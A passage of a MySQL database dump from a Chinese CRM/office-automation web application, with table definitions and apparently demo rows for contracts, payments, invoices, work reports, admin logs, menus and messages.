  `jine` int(11) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `attid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='付款记录' AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `xy_fukuan`
--

INSERT INTO `xy_fukuan` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `hid`, `mingcheng`, `bianhao`, `title`, `leixing`, `type`, `jine`, `jingban`, `beizhu`, `shenheren`, `shenhe`, `attid`) VALUES
(1, 1, '陈高明', '2015-06-02 09:55:05', 0, '', '0000-00-00 00:00:00', 1, 1, 'CRM管理系统', '1506020001', '百度公司', '差旅费', '发票报销', 500, '陈高明', '3天出差费用', '陈高明', '审核通过', 1433210061),
(2, 1, '陈高明', '2015-06-02 10:19:04', 0, '', '0000-00-00 00:00:00', 1, 2, '美容院管理系统安装版', '1506020002', '深圳腾讯公司', '招待费', '发票报销', 800, '王旭东', '客户来招待费', '陈高明', '审核通过', 1433211492),
(3, 16, '王晓丹', '2015-07-20 00:06:59', 0, '', '0000-00-00 00:00:00', 1, 15, 'dadasdas', '150713220009', 'das', '差旅费', '发票报销', 100, '', '', '王晓丹', '审核通过', 1437321994);

-- --------------------------------------------------------

--
-- 表的结构 `xy_hetong`
--

CREATE TABLE IF NOT EXISTS `xy_hetong` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(50) NOT NULL,
  `mingcheng` varchar(200) NOT NULL,
  `cid` int(11) NOT NULL,
  `title` varchar(200) NOT NULL,
  `name` varchar(50) NOT NULL,
  `dianhua` varchar(200) NOT NULL,
  `type` varchar(50) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `jztime` date NOT NULL,
  `xufei` int(11) NOT NULL,
  `jine` int(11) NOT NULL,
  `yishou` int(11) NOT NULL,
  `weishou` int(11) NOT NULL,
  `kaipiao` int(11) NOT NULL,
  `yifu` int(11) NOT NULL,
  `content` text NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `attid` int(11) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='合同管理' AUTO_INCREMENT=16 ;

--
-- 转存表中的数据 `xy_hetong`
--

INSERT INTO `xy_hetong` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `bianhao`, `mingcheng`, `cid`, `title`, `name`, `dianhua`, `type`, `jingban`, `juid`, `juname`, `jztime`, `xufei`, `jine`, `yishou`, `weishou`, `kaipiao`, `yifu`, `content`, `beizhu`, `attid`, `shenhe`, `shenheren`) VALUES
(1, 1, '陈高明', '2015-06-02 09:38:31', 0, '', '0000-00-00 00:00:00', 1, '1506020001', 'CRM管理系统', 1, '百度公司', '李彦宏', '13812349563', 'CRM/OA', '陈高明', '16,1', '王晓丹,陈高明', '2015-06-16', 0, 8350, 5000, 3350, 0, 500, '一次行购买', '没什么特殊', 1433208301, '审核通过', '陈高明'),
(2, 1, '陈高明', '2015-06-02 09:51:14', 0, '', '0000-00-00 00:00:00', 1, '1506020002', '美容院管理系统安装版', 2, '深圳腾讯公司', '马虎腾', '1381212245', '美容院管理', '王旭东', '16,1', '王晓丹,陈高明', '2016-06-02', 2000, 8850, 8850, 0, 2147483647, 800, '每年有服务费2000', '安装到他们自己的电脑上', 1433209768, '审核通过', '陈高明'),
(3, 1, '陈高明', '2015-06-02 11:26:47', 0, '', '0000-00-00 00:00:00', 1, '1506020003', 'CRM租赁版 百度', 1, '百度公司', '李彦宏', '13812349563', 'CRM/OA', '陈高明', '16,1', '王晓丹,陈高明', '2016-06-30', 1500, 6800, 0, 6800, 1000, 0, '每年付费', '租赁，按年付费', 1433215510, '审核通过', '陈高明'),
(10, 16, '王晓丹', '2015-06-16 10:08:20', 16, '王晓丹', '2015-06-29 10:48:14', 1, '150616200004', '33333', 5, '1', '1', '13299872991', '', '', '18,17,16,1', '王倩,张雨,王晓丹,陈高明', '0000-00-00', 44, 0, 0, 0, 0, 0, '', '', 1434420466, '审核通过', '王晓丹'),
(11, 16, '王晓丹', '2015-06-16 10:08:28', 0, '', '0000-00-00 00:00:00', 1, '150616280005', '33333', 5, '1', '1', '13299872991', '', '', '18,17,16,1', '王倩,张雨,王晓丹,陈高明', '0000-00-00', 44, 0, 100, -100, 0, 0, '', '', 1434420466, '审核通过', '王晓丹'),
(12, 1, '陈高明', '2015-07-08 16:13:06', 0, '', '0000-00-00 00:00:00', 1, '150708060006', '111', 0, '', '', '11111', '', '', '', '', '0000-00-00', 111, 0, 100, -100, 0, 0, '', '', 1436343092, '审核通过', '陈高明'),
(13, 1, '陈高明', '2015-07-11 18:19:44', 0, '', '0000-00-00 00:00:00', 1, '150711440007', '11', 4, '南昌房屋中介服务', '李经理', '13299872991', '软件定制', '', '16', '王晓丹', '0000-00-00', 111, 0, 0, 0, 0, 0, '', '', 1436609937, '审核通过', '陈高明'),
(14, 1, '陈高明', '2015-07-13 00:26:16', 0, '', '0000-00-00 00:00:00', 1, '150713160008', '111', 0, '', '', '111', '', '', '', '', '0000-00-00', 100, 200, 0, 200, 0, 0, '', '', 1436718313, '审核通过', '陈高明'),
(15, 1, '陈高明', '2015-07-13 13:43:22', 0, '', '0000-00-00 00:00:00', 1, '150713220009', 'dadasdas', 0, 'das', '', 'asdasdas', '', '', '', 'ddsad', '2015-07-22', 100, 0, 0, 0, 0, 100, '', '', 1436766178, '审核通过', '陈高明');

-- --------------------------------------------------------

--
-- 表的结构 `xy_hetongs`
--

CREATE TABLE IF NOT EXISTS `xy_hetongs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `bianhao` varchar(100) NOT NULL,
  `title` varchar(100) NOT NULL,
  `fenlei` varchar(50) NOT NULL,
  `type` varchar(200) NOT NULL,
  `danwei` varchar(50) NOT NULL,
  `xjiage` int(11) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `xiaoji` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `edit` tinyint(1) NOT NULL,
  `number` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='合同明细表' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `xy_huibao`
--

CREATE TABLE IF NOT EXISTS `xy_huibao` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `type` varchar(50) NOT NULL,
  `title` varchar(100) NOT NULL,
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `content` text NOT NULL,
  `attid` int(11) NOT NULL,
  `beizhu` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='工作汇报' AUTO_INCREMENT=8 ;

--
-- 转存表中的数据 `xy_huibao`
--

INSERT INTO `xy_huibao` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `type`, `title`, `juid`, `juname`, `content`, `attid`, `beizhu`) VALUES
(1, 1, '陈高明', '2015-05-25 09:42:49', 1, '陈高明', '2015-05-31 17:31:01', 1, '日总结', '2015-5-25工作总结', '16', '王晓丹', '幸福的方向', 1432518129, '\n陈高明:不错。加油\n！2015-05-25 09:56:20\n陈高明:陈高明:不错。加油！2015-05-25 09:56:20\n\n加油！2015-05-25 09:56:40\n陈高明:电风扇2015-05-25 09:58:30\n陈高明:122122015-05-31 17:31:01'),
(2, 17, '张雨', '2015-06-02 19:47:35', 16, '王晓丹', '2015-06-03 14:46:43', 1, '周总结', '本周进度正常', '16', '王晓丹', '工作进度与计划一致', 1433245558, '\n王晓丹:zxvxzcvcxz2015-06-03 14:46:43'),
(3, 16, '王晓丹', '2015-06-02 21:01:30', 16, '王晓丹', '2015-07-23 15:08:35', 0, '', 'xcs', '17,16,1', '张雨,王晓丹,陈高明', 'dcds ds', 1433250056, '\n王晓丹:asfadsfsdf2015-06-03 14:46:29\n王晓丹:112015-06-12 13:23:05\n王晓丹:asas2015-06-12 13:24:39\n王晓丹:2015-07-23 15:08:35'),
(4, 16, '王晓丹', '2015-06-03 19:28:40', 0, '', '0000-00-00 00:00:00', 1, '日总结', '11', '18', '王倩', '&lt;table width=&quot;146&quot;&gt;\n	&lt;span&gt; &lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt; &lt;/span&gt;\n	&lt;tbody&gt;\n		&lt;tr&gt;\n			&lt;span&gt; &lt;/span&gt;\n			&lt;td width=&quot;74&quot; height=&quot;18&quot; align=&quot;right&quot;&gt;\n				&lt;span&gt;4月13日&lt;/span&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n			&lt;td width=&quot;72&quot; align=&quot;left&quot;&gt;\n				&lt;span&gt;李倩&lt;/span&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n		&lt;/tr&gt;\n&lt;span&gt; &lt;/span&gt;\n		&lt;tr&gt;\n			&lt;span&gt; &lt;/span&gt;\n			&lt;td height=&quot;18&quot; align=&quot;right&quot;&gt;\n				&lt;span&gt;4月13日&lt;/span&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n			&lt;td align=&quot;left&quot;&gt;\n				&lt;span&gt;发票&lt;/span&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n		&lt;/tr&gt;\n&lt;span&gt; &lt;/span&gt;\n		&lt;tr&gt;\n			&lt;span&gt; &lt;/span&gt;\n			&lt;td height=&quot;18&quot;&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n			&lt;td&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n		&lt;/tr&gt;\n&lt;span&gt; &lt;/span&gt;\n	&lt;/tbody&gt;\n&lt;/table&gt;', 1433330852, ''),
(6, 16, '王晓丹', '2015-07-18 16:07:36', 0, '', '0000-00-00 00:00:00', 1, '日总结', '11', '18', '王倩', '1111', 1437206837, ''),
(7, 16, '王晓丹', '2015-08-02 20:49:42', 0, '', '0000-00-00 00:00:00', 1, '', '11', '', '', '', 1438519772, '');

-- --------------------------------------------------------

--
-- 表的结构 `xy_huifang`
--

CREATE TABLE IF NOT EXISTS `xy_huifang` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `title` varchar(100) NOT NULL,
  `content` varchar(255) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='客户回访' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `xy_kaipiao`
--

CREATE TABLE IF NOT EXISTS `xy_kaipiao` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `title` varchar(100) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `jine` int(11) NOT NULL,
  `piaohao` varchar(100) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='开票记录' AUTO_INCREMENT=3 ;

--
-- 转存表中的数据 `xy_kaipiao`
--

INSERT INTO `xy_kaipiao` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `hid`, `mingcheng`, `title`, `bianhao`, `jine`, `piaohao`, `jingban`, `beizhu`) VALUES
(1, 16, '王晓丹', '2015-06-02 18:28:42', 16, '王晓丹', '2015-06-03 16:17:50', 1, 3, 'CRM租赁版 百度', '百度公司', '1506020003', 1000, '123456789ABCD', '陈高明', ''),
(2, 16, '王晓丹', '2015-06-02 18:38:52', 0, '', '0000-00-00 00:00:00', 1, 2, '美容院管理系统安装版', '深圳腾讯公司', '1506020002', 2147483647, '', '王旭东', '');

-- --------------------------------------------------------

--
-- 表的结构 `xy_log`
--

CREATE TABLE IF NOT EXISTS `xy_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `addtime` datetime NOT NULL,
  `username` char(20) NOT NULL,
  `content` char(100) NOT NULL,
  `os` varchar(100) NOT NULL,
  `url` char(100) NOT NULL,
  `ip` char(20) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=14 ;

--
-- 转存表中的数据 `xy_log`
--

INSERT INTO `xy_log` (`id`, `addtime`, `username`, `content`, `os`, `url`, `ip`) VALUES
(1, '2015-08-14 20:33:30', 'admin', '锁定20', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Menu&a=lock', '127.0.0.1'),
(2, '2015-08-14 20:33:35', 'admin', '清理1条无用的记录', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Menu&a=del', '127.0.0.1'),
(3, '2015-08-14 20:34:02', 'admin', '锁定110', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Menu&a=lock', '127.0.0.1'),
(4, '2015-08-14 20:34:11', 'admin', '清理4条无用的记录', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Menu&a=del', '127.0.0.1'),
(5, '2015-08-14 20:34:26', 'admin', '编辑成功294', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=edit', '127.0.0.1'),
(6, '2015-08-14 20:34:38', 'admin', '编辑成功300', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=edit', '127.0.0.1'),
(7, '2015-08-14 20:34:50', 'admin', '编辑成功305', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=edit', '127.0.0.1'),
(8, '2015-08-14 20:34:56', 'admin', '清理15条无用的记录', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=del', '127.0.0.1'),
(9, '2015-08-14 20:35:06', 'admin', '编辑成功292', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=edit', '127.0.0.1'),
(10, '2015-08-14 20:35:11', 'admin', '清理1条无用的记录', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=del', '127.0.0.1'),
(11, '2015-08-14 20:35:39', 'admin', '编辑成功1', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=User&a=edit', '127.0.0.1'),
(12, '2015-08-14 20:35:42', 'admin', '退出成功！', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Public&a=logout', '127.0.0.1'),
(13, '2015-08-14 20:35:45', 'admin', '登录成功！', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Public&a=Login', '127.0.0.1');

-- --------------------------------------------------------

--
-- 表的结构 `xy_menu`
--

CREATE TABLE IF NOT EXISTS `xy_menu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `level` tinyint(1) NOT NULL,
  `pid` int(4) NOT NULL,
  `catename` char(20) NOT NULL DEFAULT '',
  `alink` char(100) NOT NULL DEFAULT '',
  `sort` int(4) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=214 ;

--
-- 转存表中的数据 `xy_menu`
--

INSERT INTO `xy_menu` (`id`, `level`, `pid`, `catename`, `alink`, `sort`, `status`) VALUES
(1, 0, 0, '客户管理', 'kehu/index', 1, 1),
(8, 1, 1, '已成交', 'hetong/index', 3, 1),
(7, 0, 0, '系统管理', 'system/index', 99, 1),
(9, 1, 7, '组织机构', 'org/index', 1, 1),
(10, 2, 9, '职位管理', 'dep/index', 2, 1),
(11, 2, 22, '菜单管理', 'menu/index', 4, 1),
(13, 1, 7, '操作日志', 'Log/index', 7, 1),
(14, 2, 9, '用户管理', 'user/index', 3, 1),
(21, 1, 7, '备份文件', 'database/bakup', 5, 1),
(19, 2, 22, '功能列表', 'rule/index', 5, 1),
(22, 1, 7, '系统设置', 'system/index', 1, 1),
(23, 2, 9, '部门管理', 'org/index', 0, 1),
(24, 1, 7, '数据备份', 'Database/index', 4, 1),
(25, 2, 22, '分类字典', 'datalist/index', 2, 1),
(31, 2, 22, '数据字典', 'config/index', 1, 1),
(107, 2, 119, '跟单记录', 'custgd/index', 2, 1),
(108, 2, 119, '潜在客户', 'cust/index', 0, 1),
(109, 2, 119, '联系人', 'custcon/index', 1, 1),
(113, 0, 0, '统计报表', 'tongji/index', 18, 1),
(114, 2, 118, '消息记录', 'msgs/index', 1, 1),
(115, 2, 118, '邮件记录', 'emails/index', 2, 1),
(117, 2, 118, '短信记录', 'smss/index', 3, 1),
(118, 1, 113, '通信记录', 'tongji/index', 11, 1),
(119, 1, 1, '成交前', 'cust/index', 1, 1),
(120, 2, 8, '成交客户', 'cust/cheng', 1, 1),
(121, 2, 8, '新增合同', 'hetong/add', 2, 1),
(122, 2, 8, '合同审核', 'hetong/dshenhe', 3, 1),
(123, 2, 8, '合同管理', 'hetong/index', 4, 1),
(124, 2, 119, '待跟踪客户', 'cust/daoqi', 4, 1),
(125, 1, 1, '合同执行', 'cust/index', 3, 1),
(126, 2, 125, '收款记录', 'shou/index', 1, 1),
(127, 2, 125, '开票记录', 'kaipiao/index', 2, 1),
(128, 2, 125, '出库记录', 'chuku/index', 3, 1),
(129, 2, 125, '发货记录', 'fahuo/index', 4, 1),
(130, 2, 125, '付款记录', 'fukuan/index', 5, 1),
(131, 1, 1, '售后服务', 'cust/index', 4, 1),
(132, 2, 131, '客户回访', 'huifang/index', 1, 1),
(133, 2, 131, '投诉管理', 'tousu/index', 2, 1),
(134, 2, 131, '服务记录', 'renwu/index', 3, 1),
(135, 0, 0, '仓库管理', 'cangku/index', 3, 1),
(136, 1, 135, '入库', 'cangku/index', 1, 1),
(137, 2, 136, '新增入库', 'ruku/add', 1, 1),
(138, 2, 136, '退还入库', 'ruku/add', 2, 1),
(139, 2, 136, '入库审核', 'ruku/dshenhe', 3, 1),
(140, 2, 136, '入库记录', 'ruku/index', 4, 1),
(141, 2, 136, '入库明细表', 'rukus/index', 5, 1),
(142, 1, 135, '出库', 'chuku/index', 2, 1),
(143, 2, 142, '新增出库', 'chuku/add', 1, 1),
(144, 2, 142, '出库审核', 'chuku/dshenhe', 2, 1),
(145, 2, 142, '出库记录', 'chuku/index', 3, 1),
(146, 2, 142, '出库明细表', 'chukus/index', 4, 1),
(147, 1, 135, '库存盘点', 'chanpin/index', 4, 1),
(148, 1, 135, '发货记录', 'fahuo/index', 5, 1),
(149, 0, 0, '财务管理', 'caiwu/index', 5, 1),
(150, 1, 149, '收款', 'shou/index', 1, 1),
(151, 2, 150, '新增收款', 'shou/add', 1, 1),
(152, 2, 150, '收款审核', 'shou/dshenhe', 2, 1),
(153, 2, 150, '收款记录', 'shou/index', 3, 1),
(154, 1, 149, '付款', 'fukuan/index', 2, 1),
(155, 2, 154, '新增付款', 'fukuan/add', 1, 1),
(156, 2, 154, '付款审核', 'fukuan/dshenhe', 2, 1),
(157, 2, 154, '付款记录', 'fukuan/index', 3, 1),
(158, 1, 135, '产品管理', 'chanpin/index', 0, 1),
(159, 1, 135, '库存报警', 'chanpin/baojing', 3, 1),
(160, 0, 0, '个人办公', 'bangong/index', 0, 1),
(161, 1, 160, '我的去向', 'quxiang/index', 1, 1),
(162, 1, 160, '员工去向', 'quxiangs/index', 2, 1),
(163, 1, 160, '我的任务', 'renwu/index', 3, 1),
(164, 1, 160, '分配任务', 'renwu/add', 4, 1),
(165, 1, 160, '工作汇报', 'huibao/index', 5, 1),
(166, 1, 160, '批注汇报', 'huibaos/index', 6, 1),
(181, 2, 131, '到期的合同', 'hetong/daoqi', 0, 1),
(168, 1, 160, '文档中心', 'wendang/index', 8, 1),
(169, 2, 168, '我的文档', 'wendang/index', 1, 1),
(170, 2, 168, '共享给我的', 'wendangs/index', 2, 1),
(171, 2, 168, '知识管理', 'zhishi/index', 3, 1),
(172, 1, 160, '信息中心', 'msg/index', 9, 1),
(173, 2, 172, '我的消息', 'msg/index', 1, 1),
(174, 2, 172, '通知公告', 'tongzhi/index', 2, 1),
(175, 1, 160, '通讯录', 'wdtxl/index', 10, 1),
(176, 2, 175, '我的通讯录', 'wdtxl/index', 1, 1),
(177, 2, 175, '公共通讯录', 'ggtxl/index', 2, 1),
(178, 2, 175, '单位通讯录', 'dwtxl/index', 3, 1),
(179, 1, 7, '清理缓存', 'public/clear', 10, 1),
(180, 2, 8, '合同明细表', 'hetongs/index', 6, 1),
(182, 1, 149, '开票记录', 'kaipiao/index', 4, 1),
(183, 1, 113, '客户管理', 'fxcust/index', 4, 1),
(184, 2, 183, '综合分析', 'fxcust/index', 1, 1),
(185, 2, 183, '需求分析', 'fxcust/index', 2, 1),
(186, 2, 183, '来源分析', 'fxcust/index', 3, 1),
(187, 2, 183, '进展分析', 'fxcust/index', 4, 1),
(188, 2, 183, '业务员分析', 'fxcust/index', 5, 1),
(189, 2, 183, '增长趋势分析', 'fxcust/index', 6, 1),
(190, 1, 113, '合同管理', 'fxhetong/index', 5, 1),
(191, 2, 190, '综合分析', 'fxhetong/index', 5, 1),
(192, 2, 190, '增长趋势(数量)', 'fxhetong/index', 2, 1),
(193, 2, 190, '增长趋势(签约金额)', 'fxhetong/index', 3, 1),
(194, 2, 190, '增长趋势(已收款)', 'fxhetong/index', 4, 1),
(195, 2, 190, '增长趋势(未收款)', 'fxhetong/index', 5, 1),
(196, 2, 190, '增长趋势(已开票)', 'fxhetong/index', 6, 1),
(197, 2, 190, '类型分析', 'fxhetong/index', 7, 1),
(198, 2, 190, '业务员分析', 'fxhetong/index', 8, 1),
(199, 1, 113, '仓库管理', 'fxchanpin/index', 3, 1),
(200, 2, 199, '入库分析', 'fxchanpin/index', 1, 1),
(201, 2, 199, '出库分析', 'fxchanpin/index', 2, 1),
(202, 1, 113, '财务管理', 'fxcaiwu/index', 7, 1),
(203, 2, 202, '收款分析', 'fxcaiwu/index', 1, 1),
(204, 2, 202, '付款分析', 'fxcaiwu/index', 2, 1),
(205, 2, 202, '付款类型', 'fxcaiwu/index', 3, 1),
(206, 2, 202, '业务员付款', 'fxcaiwu/index', 5, 1),
(207, 2, 190, '到期合同趋势', 'fxhetong/index', 9, 1),
(208, 2, 199, '库存统计', 'tjchanpin/index', 3, 1),
(209, 1, 113, '业绩统计', 'tjhetong/index', 0, 1),
(210, 1, 113, '老板一张表', 'tjbiao/index', 1, 1);

-- --------------------------------------------------------

--
-- 表的结构 `xy_msg`
--

CREATE TABLE IF NOT EXISTS `xy_msg` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `content` varchar(255) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `type` varchar(20) NOT NULL,
  `juid` int(11) NOT NULL,
  `viewtime` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='消息管理' AUTO_INCREMENT=13 ;

--
-- 转存表中的数据 `xy_msg`
--

INSERT INTO `xy_msg` (`id`, `uid`, `uname`, `addtime`, `content`, `status`, `type`, `juid`, `viewtime`) VALUES
(1, 1, '陈高明', '2015-05-18 00:00:00', '你新的未读消息啊<a href="/weboa/index.php?m=home&c=public&a=online" data-toggle="navtab" data-id="online"  data-title="消息提醒123">消息 <span class="badge">1</span></a>', 1, '系统', 1, '2015-05-19 08:14:45'),
(2, 0, '系统管理员', '0000-00-00 00:00:00', '登陆成功', 1, '', 0, '2015-05-19 08:26:32'),
(3, 0, '系统管理员', '2015-05-19 08:28:14', '登陆成功', 1, '系统类', 1, '2015-05-19 08:29:27'),
(4, 0, '系统管理员', '2015-05-19 08:30:05', '登陆成功', 1, '系统类', 1, '2015-05-19 09:35:49'),
(5, 0, '系统管理员', '2015-05-19 08:30:17', '登陆成功', 1, '系统类', 1, '2015-05-19 08:30:22'),
(6, 1, 'admin', '2015-05-19 13:45:53', '', 1, '', 0, '2015-05-19 17:28:54'),
(7, 1, 'admin', '2015-05-19 13:45:58', '', 1, '', 0, '2015-05-19 14:04:38'),
(8, 17, 'user1', '2015-06-16 13:51:45', 'fdsf', 1, '系统', 0, '0000-00-00 00:00:00'),
(9, 17, 'user1', '2015-06-16 13:51:48', 'fdsf', 1, '系统', 0, '0000-00-00 00:00:00'),
(10, 17, 'user1', '2015-06-16 13:51:50', 'fdsf', 1, '系统', 0, '0000-00-00 00:00:00'),
(11, 17, 'user1', '2015-06-16 13:52:08', 'fdsf', 1, '系统', 17, '2015-06-16 13:52:14'),
(12, 17, 'user1', '2015-06-16 13:52:11', 'fdsf', 1, '系统', 17, '2015-07-07 03:24:20');

-- --------------------------------------------------------

--
-- 表的结构 `xy_quxiang`
--

CREATE TABLE IF NOT EXISTS `xy_quxiang` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `ktime` datetime NOT NULL,
  `jtime` datetime NOT NULL,
  `type` varchar(50) NOT NULL,
  `title` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='我的去向' AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `xy_quxiang`
--

INSERT INTO `xy_quxiang` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `ktime`, `jtime`, `type`, `title`) VALUES
(1, 16, '王晓丹', '2015-08-05 10:03:00', 0, '', '0000-00-00 00:00:00', 1, '2015-08-05 09:56:25', '2015-08-07 09:56:29', '外出', '1111111111111');

-- --------------------------------------------------------

--
-- 表的结构 `xy_renwu`
--

CREATE TABLE IF NOT EXISTS `xy_renwu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `jztime` datetime NOT NULL,
  `hid` int(11) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `biaoti` varchar(100) NOT NULL,
  `content` text NOT NULL,
  `beizhu` text NOT NULL,
  `attid` int(11) NOT NULL,
  `jieguo` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='任务管理' AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `xy_renwu`
--

INSERT INTO `xy_renwu` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `juid`, `juname`, `jztime`, `hid`, `mingcheng`, `biaoti`, `content`, `beizhu`, `attid`, `jieguo`) VALUES
